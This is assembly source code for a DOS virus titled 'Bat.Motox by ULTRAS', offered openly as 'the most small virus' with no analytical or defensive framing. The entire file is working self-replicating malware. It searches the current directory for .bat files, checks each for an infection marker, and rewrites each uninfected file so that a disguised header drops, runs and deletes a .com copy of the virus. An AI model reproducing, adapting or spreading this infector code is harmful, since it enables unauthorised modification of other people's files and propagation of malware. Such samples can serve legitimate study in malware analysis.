; 
; Bat.Motox by ULTRAS
;
; The most small virus write on asm. Infects bat in current directory, 
; is written in begin bat files.
;

.model tiny
.code
org 100h
start:
db "::"
jmp v_start
db 13,10
db "@copy %0 $-$.com>nul",13,10
db "@$-$.com",13,10
db "@del $-$.com",13,10
db "::"
v_start:
mov ah,4eh
lea dx,batname
int 21h
jc quit
jmp infect
again:
mov ah,4fh
int 21h
jc quit
infect:
mov ax,3d02h
mov dx,9eh
int 21h
jc again
mov bx,ax
mov cx,ds:[9ah]
mov ah,3fh
lea dx,buf
int 21h	
mov ax,word ptr ds:[start]
cmp word ptr ds:[buf],ax
jz close
xor cx,cx
xor dx,dx
mov ax,4200h
int 21h
mov ah,40h
mov dx,100h
mov cx,offset buf-100h
int 21h
mov ah,40h		
mov cx,ds:[9ah]		
lea dx,buf		
int 21h						
close:
mov ah,3fh	
dec ah		
int 21h
jmp again		
quit:
mov ax,4c00h
int 21h
batname db '*.bat',0
db 0dh,0ah	
buf:
end start
